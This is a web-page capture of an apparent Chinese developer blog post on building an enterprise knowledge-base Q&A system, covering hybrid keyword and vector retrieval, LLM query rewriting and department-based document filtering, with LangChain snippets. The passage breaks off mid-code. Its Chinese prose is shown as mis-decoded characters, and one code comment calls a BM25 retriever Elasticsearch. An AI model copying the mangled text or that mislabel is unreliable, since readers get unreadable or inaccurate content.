content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»éœ€æ±‚åˆ°è½åœ°ï¼šæˆ‘ä»¬æ˜¯å¦‚ä½•æ­å»ºä¼ä¸šçŸ¥è¯†åº“é—®ç­”ç³»ç»Ÿçš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:44:37.000Z" title="Thu Jan 08 2026 02:44:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€éœ€æ±‚ä»å“ªæ¥ï¼Ÿ</h2>
<p>å»å¹´ä¸‹åŠå¹´ï¼Œå…¬å¸HRéƒ¨é—¨æ‰¾åˆ°æˆ‘ä»¬ï¼Œè¯´å‘˜å·¥æ¯å¤©éƒ½åœ¨é—®é‡å¤çš„é—®é¢˜ï¼š</p>
<ul>
<li>"å…¥èŒéœ€è¦å‡†å¤‡ä»€ä¹ˆææ–™ï¼Ÿ"</li>
<li>"å‡ºå·®ä½å®¿èƒ½æŠ¥å¤šå°‘é’±ï¼Ÿ"</li>
<li>"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ"</li>
</ul>
<p>HRåŒäº‹æ¯å¤©è¦å›ç­”å‡ åéåŒæ ·çš„é—®é¢˜ï¼Œå®åœ¨å—ä¸äº†äº†ã€‚ä»–ä»¬å¸Œæœ›èƒ½æœ‰ä¸ªç³»ç»Ÿï¼Œå‘˜å·¥è‡ªå·±é—®ï¼Œç³»ç»Ÿè‡ªå·±ç­”ã€‚</p>
<p>å¬èµ·æ¥å¾ˆç®€å•å¯¹å§ï¼Ÿä¸å°±æ˜¯åšä¸ªFAQå—ï¼Ÿä½†å½“æˆ‘ä»¬æ·±å…¥èŠä¸‹å»ï¼Œå‘ç°äº‹æƒ…æ²¡é‚£ä¹ˆç®€å•ã€‚</p>
<p>è´¢åŠ¡éƒ¨ä¹Ÿæœ‰ç±»ä¼¼éœ€æ±‚ï¼Œä½†ä»–ä»¬çš„æ–‡æ¡£å‘˜å·¥ä¸èƒ½éšä¾¿çœ‹ã€‚ITéƒ¨ä¹Ÿæƒ³æŠŠä»–ä»¬çš„æ“ä½œæ‰‹å†Œæ¥è¿›æ¥ï¼Œä½†ä¹Ÿä¸æƒ³è®©å…¶ä»–éƒ¨é—¨çœ‹åˆ°å†…éƒ¨ç³»ç»Ÿé…ç½®ã€‚</p>
<p><strong>æ ¸å¿ƒéœ€æ±‚å…¶å®æ˜¯ï¼š</strong></p>
<ul>
<li>å‘˜å·¥èƒ½ç”¨è‡ªç„¶è¯­è¨€æé—®</li>
<li>ç³»ç»Ÿèƒ½ç†è§£å¹¶ç»™å‡ºå‡†ç¡®ç­”æ¡ˆ</li>
<li>ä¸åŒéƒ¨é—¨çš„æ–‡æ¡£è¦ä¸¥æ ¼éš”ç¦»</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[å‘˜å·¥æé—®] --&gt;|è‡ªç„¶è¯­è¨€| B[çŸ¥è¯†åº“ç³»ç»Ÿ]
    B --&gt; C{æƒé™æ£€æŸ¥}
    C --&gt;|HRéƒ¨é—¨| D[HRæ–‡æ¡£]
    C --&gt;|è´¢åŠ¡éƒ¨é—¨| E[è´¢åŠ¡æ–‡æ¡£]
    C --&gt;|ITéƒ¨é—¨| F[ITæ–‡æ¡£]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1e1
    style D fill:#e1ffe1
    style E fill:#e1ffe1
    style F fill:#e1ffe1
</code></pre>
<h2 data-id="heading-1">äºŒã€ç¬¬ä¸€ä¸ªæ€è€ƒï¼šæ£€ç´¢æ–¹å¼æ€ä¹ˆé€‰ï¼Ÿ</h2>
<p>å½“æ—¶æˆ‘ä»¬è°ƒç ”äº†ä¸¤ç§ä¸»æµæ–¹æ¡ˆï¼š</p>
<h3 data-id="heading-2">æ–¹æ¡ˆAï¼šå…³é”®è¯æ£€ç´¢ï¼ˆElasticsearchï¼‰</h3>
<p>å°±æ˜¯ä¼ ç»Ÿçš„å…¨æ–‡æ£€ç´¢ï¼Œç”¨æˆ·è¾“å…¥"å‡ºå·®ä½å®¿"ï¼Œç³»ç»Ÿæ‰¾åŒ…å«è¿™äº›è¯çš„æ–‡æ¡£ã€‚</p>
<p><strong>ä¼˜ç‚¹å¾ˆæ˜æ˜¾ï¼š</strong></p>
<ul>
<li>å¯æ§æ€§å¼ºï¼Œç»“æœå¯é¢„æµ‹</li>
<li>èƒ½ç²¾ç¡®åŒ¹é…æœ¯è¯­</li>
<li>å‡ºé—®é¢˜å®¹æ˜“è°ƒè¯•</li>
</ul>
<p><strong>ä½†é—®é¢˜ä¹Ÿå¾ˆæ˜æ˜¾ï¼š</strong></p>
<p>å‘˜å·¥å®é™…é—®çš„æ˜¯ï¼š"å»ä¸Šæµ·å‡ºå·®ï¼Œé…’åº—èƒ½æŠ¥å¤šå°‘é’±ï¼Ÿ"</p>
<p>ä½ çš„æ–‡æ¡£å†™çš„æ˜¯ï¼š"ä¸€çº¿åŸå¸‚å·®æ—…ä½å®¿æ ‡å‡†ä¸º500å…ƒ/å¤©"</p>
<p>å…³é”®è¯æ£€ç´¢å¯èƒ½å°±æ‰¾ä¸åˆ°äº†ï¼Œå› ä¸ºå®ƒçœ‹ä¸æ‡‚"ä¸Šæµ·"="ä¸€çº¿åŸå¸‚"ï¼Œ"é…’åº—"="ä½å®¿"ã€‚</p>
<h3 data-id="heading-3">æ–¹æ¡ˆBï¼šå‘é‡æ£€ç´¢ï¼ˆEmbeddingï¼‰</h3>
<p>æŠŠæ–‡æ¡£å’Œé—®é¢˜éƒ½è½¬æˆå‘é‡ï¼Œç„¶åç®—ç›¸ä¼¼åº¦ã€‚ç†è®ºä¸Šèƒ½ç†è§£è¯­ä¹‰ã€‚</p>
<p><strong>å¬èµ·æ¥å¾ˆç¾å¥½ï¼š</strong></p>
<ul>
<li>ä¸ç”¨ç»´æŠ¤åŒä¹‰è¯åº“</li>
<li>èƒ½ç†è§£è‡ªç„¶è¯­è¨€</li>
<li>å¯¹æé—®æ–¹å¼ä¸æ•æ„Ÿ</li>
</ul>
<p><strong>ä½†æˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™å‘ç°äº†ä¸ªå¤§é—®é¢˜ã€‚</strong></p>
<h2 data-id="heading-4">ä¸‰ã€å…³é”®è½¬æŠ˜ç‚¹ï¼šHR-Linkçš„å›°å¢ƒ</h2>
<p>æˆ‘ä»¬æœ‰ä¸ªå†…éƒ¨ç³»ç»Ÿå«"HR-Link"ï¼Œæ˜¯å…¬å¸è‡ªç ”çš„äººäº‹ç³»ç»Ÿã€‚</p>
<p>æµ‹è¯•ä¸­å‘ç°ä¸¤ä¸ªå…¸å‹åœºæ™¯ï¼š</p>
<p><strong>åœºæ™¯1ï¼šæ–°å‘˜å·¥ç›´æ¥é—®ç³»ç»Ÿåç§°</strong></p>
<p>å‘˜å·¥é—®ï¼š"HR-Linkçš„ç™»å½•åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ"</p>
<ul>
<li>Elasticsearchï¼šâœ… èƒ½æ‰¾åˆ°ï¼Œç²¾ç¡®åŒ¹é…"HR-Link"è¿™ä¸ªè¯</li>
<li>å‘é‡æ£€ç´¢ï¼šâŒ æ‰¾ä¸åˆ°ï¼Œå› ä¸ºembeddingæ¨¡å‹æ²¡è§è¿‡è¿™ä¸ªä¸“æœ‰åè¯</li>
</ul>
<p><strong>åœºæ™¯2ï¼šå‘˜å·¥ç”¨è‡ªç„¶è¯­è¨€é—®åŠŸèƒ½</strong></p>
<p>å‘˜å·¥é—®ï¼š"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ"</p>
<p>æ–‡æ¡£å†™çš„æ˜¯ï¼š"æ— æ³•ç™»å½•æ—¶ï¼Œè¯·åœ¨HR-Linkä¸­ç‚¹å‡»'å¿˜è®°å¯†ç 'é‡ç½®å‡­è¯"</p>
<ul>
<li>Elasticsearchï¼šâŒ æ‰¾ä¸åˆ°ï¼Œå› ä¸ºå‘˜å·¥æ²¡æ"HR-Link"è¿™ä¸ªè¯</li>
<li>å‘é‡æ£€ç´¢ï¼šâœ… èƒ½æ‰¾åˆ°ï¼Œç†è§£"å¿˜è®°å¯†ç "å’Œ"æ— æ³•ç™»å½•"æ˜¯åŒä¸€ä»¶äº‹</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9625dbac2d684844a1d7a32796d0a78d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LiP5rWq5peg55eV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445077&amp;x-signature=ognh93pHwxdFoCjo6ThA1%2FhBDyw%3D" alt="3.jpg" loading="lazy"/></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬æ„è¯†åˆ°ï¼š<strong>ä¸¤ç§æ–¹æ³•å„æœ‰ç›²åŒºã€‚</strong></p>
<p><strong>å…³é”®è¯æ£€ç´¢çš„ç›²åŒºï¼š</strong></p>
<ul>
<li>ç†è§£ä¸äº†åŒä¹‰æ›¿æ¢</li>
<li>å¤„ç†ä¸äº†å£è¯­åŒ–è¡¨è¾¾</li>
<li>éœ€è¦äººå·¥ç»´æŠ¤è¯å…¸</li>
</ul>
<p><strong>å‘é‡æ£€ç´¢çš„ç›²åŒºï¼š</strong></p>
<ul>
<li>ä¸è®¤è¯†å…¬å¸å†…éƒ¨æœ¯è¯­ï¼ˆHR-Linkã€F-Flowã€IT-SOP-005...ï¼‰</li>
<li>å¯¹ä¸“æœ‰åè¯ã€é¡¹ç›®ä»£å·æ— èƒ½ä¸ºåŠ›</li>
</ul>
<p>é‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<h2 data-id="heading-5">å››ã€æˆ‘ä»¬çš„æ–¹æ¡ˆï¼šæ··åˆæ£€ç´¢</h2>
<p>æ—¢ç„¶å•ç‹¬ç”¨éƒ½æœ‰é—®é¢˜ï¼Œé‚£å°±ä¸¤ä¸ªä¸€èµ·ç”¨ã€‚</p>
<p><strong>æ ¸å¿ƒæ€è·¯ï¼š</strong></p>
<ol>
<li>Elasticsearchæ‰¾10æ¡ï¼ˆä¿è¯å†…éƒ¨æœ¯è¯­èƒ½å‘½ä¸­ï¼‰</li>
<li>å‘é‡æ£€ç´¢æ‰¾10æ¡ï¼ˆä¿è¯è¯­ä¹‰ç›¸å…³çš„èƒ½æ‰¾åˆ°ï¼‰</li>
<li>åˆå¹¶å»é‡ï¼ŒæŒ‰æ–‡æ¡£å…ƒæ•°æ®æ’åº</li>
<li>æŠŠæœ€ç»ˆç»“æœäº¤ç»™LLMç”Ÿæˆç­”æ¡ˆ</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ç”¨æˆ·é—®é¢˜] --&gt; B[ESæ£€ç´¢]
    A --&gt; C[å‘é‡æ£€ç´¢]
    B --&gt; D[10æ¡ç»“æœ]
    C --&gt; E[10æ¡ç»“æœ]
    D --&gt; F[åˆå¹¶å»é‡]
    E --&gt; F
    F --&gt; G[æ’åºç­›é€‰]
    G --&gt; H[LLMç”Ÿæˆç­”æ¡ˆ]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#fff4e1
    style D fill:#e1ffe1
    style E fill:#e1ffe1
    style F fill:#ffe1f5
    style G fill:#ffe1f5
    style H fill:#e1f5ff
</code></pre>
<p>ä¸¾ä¸ªå®é™…ä¾‹å­ï¼š</p>
<p><strong>åœºæ™¯1ï¼šå†…éƒ¨ç³»ç»Ÿåç§°</strong></p>
<p>å‘˜å·¥é—®ï¼š"HR-Linkçš„ç™»å½•åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ"</p>
<ul>
<li>ESæœ"HR-Link" â†’ æ‰¾åˆ°æ–‡æ¡£ï¼ˆç²¾ç¡®åŒ¹é…ä¸“æœ‰åè¯ï¼‰âœ“</li>
<li>å‘é‡æœç´¢ â†’ æ‰¾ä¸åˆ°ï¼ˆæ¨¡å‹ä¸è®¤è¯†è¿™ä¸ªè¯ï¼‰âœ—</li>
</ul>
<p>æœ€ç»ˆèƒ½è¿”å›æ­£ç¡®ç­”æ¡ˆï¼Œå› ä¸ºESæ‰¾åˆ°äº†ã€‚</p>
<p><strong>åœºæ™¯2ï¼šåŠŸèƒ½æ€§æé—®</strong></p>
<p>å‘˜å·¥é—®ï¼š"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ"</p>
<p>æ–‡æ¡£å†™çš„æ˜¯ï¼š"æ— æ³•ç™»å½•æ—¶ï¼Œè¯·åœ¨HR-Linkä¸­ç‚¹å‡»'å¿˜è®°å¯†ç 'é‡ç½®å‡­è¯"</p>
<ul>
<li>ESæœ"å¿˜è®°å¯†ç " â†’ å¯èƒ½æ‰¾ä¸åˆ°ï¼ˆå‘˜å·¥æ²¡æ"HR-Link"ï¼Œæ’åé åï¼‰âœ—</li>
<li>å‘é‡æœç´¢ â†’ ç†è§£"å¿˜è®°å¯†ç "å’Œ"æ— æ³•ç™»å½•"çš„è¯­ä¹‰å…³è” âœ“</li>
</ul>
<p>æœ€ç»ˆä¹Ÿèƒ½è¿”å›æ­£ç¡®ç­”æ¡ˆï¼Œå› ä¸ºå‘é‡æ‰¾åˆ°äº†ã€‚</p>
<p><strong>åœºæ™¯3ï¼šå£è¯­åŒ–è¡¨è¾¾</strong></p>
<p>å‘˜å·¥é—®ï¼š"æˆ‘ç™»ä¸ä¸Šä»£ç å¹³å°äº†"</p>
<p>æ–‡æ¡£å†™çš„æ˜¯ï¼š"æ— æ³•è®¿é—®GitLabæ—¶ï¼Œè¯·æ£€æŸ¥VPNè¿æ¥"</p>
<ul>
<li>ESæœ"ç™»ä¸ä¸Šä»£ç å¹³å°" â†’ æ‰¾ä¸åˆ°ï¼ˆå­—é¢ä¸åŒ¹é…ï¼‰âœ—</li>
<li>å‘é‡æœç´¢ â†’ ç†è§£"ç™»ä¸ä¸Š"â‰ˆ"æ— æ³•è®¿é—®"ï¼Œ"ä»£ç å¹³å°"â‰ˆ"GitLab"âœ“</li>
</ul>
<p>æœ€ç»ˆä¹Ÿèƒ½è¿”å›æ­£ç¡®ç­”æ¡ˆã€‚</p>
<p><strong>è¿™å°±æ˜¯äº’è¡¥ã€‚</strong></p>
<h2 data-id="heading-6">äº”ã€ç¬¬äºŒä¸ªéš¾é¢˜ï¼šå¤šè½®å¯¹è¯</h2>
<p>æ–¹æ¡ˆè·‘èµ·æ¥åï¼Œæˆ‘ä»¬åˆå‘ç°äº†æ–°é—®é¢˜ã€‚</p>
<p>å‘˜å·¥ç¬¬ä¸€æ¬¡é—®ï¼š"ä¸€çº¿åŸå¸‚å‡ºå·®ä½å®¿æ ‡å‡†æ˜¯å¤šå°‘ï¼Ÿ"</p>
<p>ç³»ç»Ÿç­”ï¼š"500å…ƒ/å¤©"</p>
<p>ç´§æ¥ç€å‘˜å·¥é—®ï¼š"äºŒçº¿åŸå¸‚å‘¢ï¼Ÿ"</p>
<p>ç³»ç»Ÿæ‡µäº†ã€‚</p>
<p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º"äºŒçº¿åŸå¸‚å‘¢ï¼Ÿ"è¿™ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>æ²¡æœ‰ä¸»è¯­</li>
<li>æ²¡æœ‰åŠ¨è¯</li>
<li>æ²¡æœ‰å®Œæ•´è¯­å¢ƒ</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[é—®é¢˜1: ä¸€çº¿åŸå¸‚ä½å®¿æ ‡å‡†?] --&gt; B[ç³»ç»Ÿ: 500å…ƒ/å¤©]
    B --&gt; C[é—®é¢˜2: äºŒçº¿åŸå¸‚å‘¢?]
    C --&gt; D{é—®é¢˜}
    D --&gt; E[ESæœäºŒçº¿åŸå¸‚&lt;br/&gt;å¯èƒ½æ‰¾åˆ°æ— å…³å†…å®¹]
    D --&gt; F[å‘é‡å¤ªçŸ­&lt;br/&gt;è¯­ä¹‰ä¸æ¸…æ™°]
    
    style A fill:#e1f5ff
    style B fill:#e1ffe1
    style C fill:#e1f5ff
    style D fill:#ffe1e1
    style E fill:#ffe1e1
    style F fill:#ffe1e1
</code></pre>
<p>å¦‚æœç›´æ¥å»æ£€ç´¢"äºŒçº¿åŸå¸‚"ï¼Œå¯èƒ½ä¼šæ‰¾åˆ°ï¼š</p>
<ul>
<li>"äºŒçº¿åŸå¸‚æ‹›è˜æ”¿ç­–"</li>
<li>"äºŒçº¿åŸå¸‚åŠå…¬å®¤åœ°å€"</li>
<li>å„ç§ä¸ç›¸å…³çš„å†…å®¹</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼šQuery Rewritingï¼ˆæŸ¥è¯¢é‡å†™ï¼‰</strong></p>
<p>åœ¨æ£€ç´¢ä¹‹å‰ï¼Œå…ˆè®©LLMçœ‹ä¸€çœ¼å¯¹è¯å†å²ï¼ŒæŠŠé—®é¢˜è¡¥å…¨ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet">å†å²ï¼š
<span class="hljs-symbol">Q1:</span> <span class="hljs-string">"ä¸€çº¿åŸå¸‚å‡ºå·®ä½å®¿æ ‡å‡†æ˜¯å¤šå°‘ï¼Ÿ"</span>
<span class="hljs-symbol">A1:</span> <span class="hljs-string">"500å…ƒ/å¤©"</span>

å½“å‰é—®é¢˜ï¼š<span class="hljs-string">"äºŒçº¿åŸå¸‚å‘¢ï¼Ÿ"</span>

é‡å†™åï¼š<span class="hljs-string">"äºŒçº¿åŸå¸‚å‡ºå·®ä½å®¿æ ‡å‡†æ˜¯å¤šå°‘ï¼Ÿ"</span>
</code></pre>
<p>é‡å†™åå†å»æ£€ç´¢ï¼Œå°±èƒ½å‡†ç¡®æ‰¾åˆ°æ–‡æ¡£äº†ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[äºŒçº¿åŸå¸‚å‘¢?] --&gt; B[LLMé‡å†™]
    B --&gt; C[äºŒçº¿åŸå¸‚å‡ºå·®&lt;br/&gt;ä½å®¿æ ‡å‡†?]
    C --&gt; D[æ··åˆæ£€ç´¢]
    D --&gt; E[æ‰¾åˆ°æ­£ç¡®æ–‡æ¡£]
    
    style A fill:#ffe1e1
    style B fill:#fff4e1
    style C fill:#e1ffe1
    style D fill:#fff4e1
    style E fill:#e1ffe1
</code></pre>
<h2 data-id="heading-7">å…­ã€æƒé™éš”ç¦»æ€ä¹ˆåšï¼Ÿ</h2>
<p>è¿™æ˜¯æ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨åŸºçº¿ã€‚</p>
<p>æˆ‘ä»¬çš„åšæ³•å¾ˆç®€å•ï¼š<strong>åœ¨æ–‡æ¡£å…¥åº“æ—¶æ‰“æ ‡ç­¾ï¼Œæ£€ç´¢æ—¶è¿‡æ»¤ã€‚</strong></p>
<h3 data-id="heading-8">æ–‡æ¡£å…¥åº“</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–‡æ¡£å…ƒæ•°æ®</span>
{
    <span class="hljs-string">"content"</span>: <span class="hljs-string">"å·®æ—…ä½å®¿æ ‡å‡†..."</span>,
    <span class="hljs-string">"metadata"</span>: {
        <span class="hljs-string">"department"</span>: <span class="hljs-string">"finance"</span>,      <span class="hljs-comment"># æ‰€å±éƒ¨é—¨</span>
        <span class="hljs-string">"doc_type"</span>: <span class="hljs-string">"policy"</span>,          <span class="hljs-comment"># æ–‡æ¡£ç±»å‹</span>
        <span class="hljs-string">"is_latest"</span>: true,             <span class="hljs-comment"># æ˜¯å¦æœ€æ–°ç‰ˆæœ¬</span>
        <span class="hljs-string">"update_time"</span>: <span class="hljs-string">"2024-12-01"</span>
    }
}
</code></pre>
<h3 data-id="heading-9">æ£€ç´¢æ—¶è¿‡æ»¤</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç”¨æˆ·ç™»å½•åï¼Œè·å–éƒ¨é—¨ä¿¡æ¯</span>
user_department = <span class="hljs-string">"finance"</span>

<span class="hljs-comment"># ESæ£€ç´¢æ—¶åŠ filter</span>
es_filter = {
    <span class="hljs-string">"department"</span>: user_department
}

<span class="hljs-comment"># å‘é‡æ£€ç´¢æ—¶ä¹ŸåŠ filter</span>
vector_filter = {
    <span class="hljs-string">"department"</span>: user_department
}
</code></pre>
<p>è¿™æ ·å°±èƒ½ä¿è¯ï¼š</p>
<ul>
<li>è´¢åŠ¡éƒ¨å‘˜å·¥åªèƒ½æœåˆ°è´¢åŠ¡æ–‡æ¡£</li>
<li>HRéƒ¨å‘˜å·¥åªèƒ½æœåˆ°HRæ–‡æ¡£</li>
<li>å®Œå…¨åœ¨æ£€ç´¢å±‚é¢éš”ç¦»ï¼Œä¸æ˜¯ç”Ÿæˆæ—¶æ‰è¿‡æ»¤</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[å‘˜å·¥ç™»å½•] --&gt; B{èº«ä»½è®¤è¯}
    B --&gt;|è´¢åŠ¡éƒ¨| C[æ£€ç´¢è´¢åŠ¡æ–‡æ¡£]
    B --&gt;|HRéƒ¨| D[æ£€ç´¢HRæ–‡æ¡£]
    B --&gt;|ITéƒ¨| E[æ£€ç´¢ITæ–‡æ¡£]
    C --&gt; F[æ··åˆæ£€ç´¢]
    D --&gt; F
    E --&gt; F
    F --&gt; G[LLMç”Ÿæˆç­”æ¡ˆ]
    
    style A fill:#e1f5ff
    style B fill:#ffe1e1
    style C fill:#e1ffe1
    style D fill:#e1ffe1
    style E fill:#e1ffe1
    style F fill:#fff4e1
    style G fill:#e1f5ff
</code></pre>
<h2 data-id="heading-10">ä¸ƒã€æŠ€æœ¯å®ç°</h2>
<p>æ•´ä¸ªç³»ç»ŸåŸºäºLangChainæ„å»ºï¼Œä¸»è¦ç»„ä»¶ï¼š</p>
<h3 data-id="heading-11">1. æ–‡æ¡£å¤„ç†</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.text_splitter <span class="hljs-keyword">import</span> RecursiveCharacterTextSplitter

<span class="hljs-comment"># æ–‡æ¡£åˆ†å—</span>
text_splitter = RecursiveCharacterTextSplitter(
    chunk_size=<span class="hljs-number">500</span>,
    chunk_overlap=<span class="hljs-number">50</span>
)

chunks = text_splitter.split_documents(documents)
</code></pre>
<h3 data-id="heading-12">2. åŒè·¯æ£€ç´¢</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.retrievers <span class="hljs-keyword">import</span> EnsembleRetriever
<span class="hljs-keyword">from</span> langchain.vectorstores <span class="hljs-keyword">import</span> FAISS
<span class="hljs-keyword">from</span> langchain.retrievers <span class="hljs-keyword">import</span> BM25Retriever

<span class="hljs-comment"># Elasticsearchæ£€ç´¢å™¨</span>
bm25_retriever = BM25Retriever.from_documents(chunks)
bm25_retriever.k = <span class="hljs-number">10</span>

<span class="hljs-comment"># å‘é‡æ£€ç´¢å™¨</span>
vectorstore = FAISS.from_documents(chunks, embeddings)
vector_retriever = vectorstore.as_retriever(search_kwargs={<span class="hljs-string">"k"</span>: <span class="hljs-number">10</span>})

<span class="hljs-comment"># æ··åˆæ£€ç´¢</span>
ensemble_retriever = EnsembleRetriever(
    retrievers=[bm25_retriever, vector_retriever],
    weights=[<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>]
)
</code></pre>
<h3 data-id="heading-13">3. Queryé‡å†™</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate
<span class="hljs-keyword">from</span> langchain.chat_models <span class="hljs-keyword">import</span> ChatAnthropic

